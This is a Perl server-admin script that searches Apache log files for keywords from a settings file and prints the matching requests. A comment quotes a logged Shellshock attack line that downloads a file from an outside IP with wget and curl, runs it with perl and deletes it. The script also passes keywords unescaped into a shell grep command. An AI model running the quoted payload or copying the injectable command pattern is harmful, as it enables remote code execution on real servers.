#!/usr/bin/perl
#
# 15:48 2014/11/18
# Jonathan Tsai
# Ver 1.00
#
# 檢核特定目錄內檔案狀況
# Usage : chkfiles.pl <setting_file> <config_file>
#  * <setting_file> : default is chkfiles.set
#  * <config_file> : default is chkfiles.conf
#
# 1.00 (15:48 2014/11/18) First Version Release
#
$prgname = substr($0, rindex($0,"/")+1);
$ver = "1.00 (15:48 2014/11/18)";

$p_setting = !defined($ARGV[0])?"/opt/trysrvtool/chkfiles.set":$ARGV[0];
$p_config = !defined($ARGV[1])?"/opt/trysrvtool/chkfiles.conf":$ARGV[1];

$conf_logpath = "/var/log/httpd";
$conf_logfiles = "$conf_logpath/*";

if (-e $p_config) {
	require($p_config);
}

@arr_keyword=();
if (-e $p_setting) {
	@tmp_setting = split(/\n/, `/bin/cat $p_setting | /bin/grep -v "#"`);
	foreach $v_setting (@tmp_setting) {
		if (length($v_setting)>0) {
			push @arr_keyword, $v_setting;
		}
	}
}

if (@arr_keyword==0) {
	exit;
}

$v_t1 = time;
$g_msg = "# $prgname Ver $ver \n";
$v_msg = "";
$v_idx = 0;

foreach $v_keyword (@arr_keyword) {
	# 出現這關鍵字的 log file 清單
	# grep keyword logpath/access_log* logpath/ssl_access_log*
	$v_idx++;
	$t_loglist = `/bin/grep '$v_keyword' $conf_logfiles`;
	$t_logmsg = procLog($t_loglist);
	if (length($t_logmsg)>0) {
		$v_msg .= "Keyword#$v_idx : [$v_keyword]\n";
		$v_msg .= "-----\n";
		$v_msg .= $t_logmsg;
		$v_msg .= "-----\n";
	}
}

$v_t2 = time;
if (length($v_msg)>0) {
	$g_msg .= envInfo($v_t1, $v_t2)."\n";
	print($g_msg);
	print($v_msg);
	print("=====\n");
}

# procLog
# Result Type & Sample
# 1: ssl_access_log-20140921:27.100.11.157 - - [16/Sep/2014:16:18:46 +0800] "POST /main/info.php HTTP/1.1" 200 34
# 2: access_log-20140928:142.4.215.115 - - [01/Oct/2014:09:46:59 +0800] "GET /cgi-bin/hi HTTP/1.0" 404 285 "-" "() { :;}; /bin/bash -c \"cd /tmp;wget http://89.33.193.10/ji;curl -O /tmp/ji http://89.33.193.10/ji ; perl /tmp/ji;rm -rf /tmp/ji\""
# 3: ssl_request_log-20140921:[16/Sep/2014:15:28:41 +0800] 210.201.79.21 TLSv1.2 DHE-RSA-AES128-SHA "GET /main/info.php HTTP/1.1" 1928
# 4: error_log-20140921:Saving to: `/var/www/html/main/info.php'
sub procLog {
  local($p_loglist) = @_;
  local($v_msg);
  local($t_logline, $t_head, $t1, $t2, $t_time, $t3, $t_method, $t_url, $t_httpver, $t_httpcode, $t_httplen);
  
	$v_msg = '';
	foreach $t_logline (split(/\n/, $p_loglist)) {
		($t_head, $t1, $t2, $t_time, $t3, $t_method, $t_url, $t_httpver, $t_httpcode, $t_httplen) = split(' ', $t_logline);
		($t_logfile, $t_accessip) = split(':', $t_head);
		$t_logfile =~ s/$conf_logpath\///g;
		$t_time = substr($t_time, 1);
		$t_method = substr($t_method, 1);
		$t_httpver =~ s/\"//g;

		$v_msg .= "$t_logfile\t$t_accessip\t$t_time\t$t_method\t$t_url\t$t_httpcode\n";
	}
	
  return($v_msg);
}

sub envInfo {
  local($p_t1, $p_t2) = @_;
  local($v_msg, $t_msg, $t_runsec);
  
	$t_msg = `/bin/hostname`;
	$t_msg =~ s/\n|\r//g;
	$t_rundt = the_datetime($p_t1);
	$t_runsec = $p_t2 - $p_t1;

	$v_msg = "Hostname:[$t_msg] Procdate:[$t_rundt] Taketime:[$t_runsec]Sec.";

  return($v_msg);
}

sub the_datetime {
  local($p_sec_vaule) = @_;
  local(@t_datetime, $i);

  @t_datetime = localtime($p_sec_vaule);
  $t_datetime[4] ++;
  $t_datetime[5] += 1900;

  for($i=0; $i<6; $i++) {
    if (length($t_datetime[$i]) == 1) {
      $t_datetime[$i] = "0".$t_datetime[$i];
    }
  }
  return($t_datetime[5].'-'.$t_datetime[4].'-'.$t_datetime[3].' '.$t_datetime[2].':'.$t_datetime[1]);
}
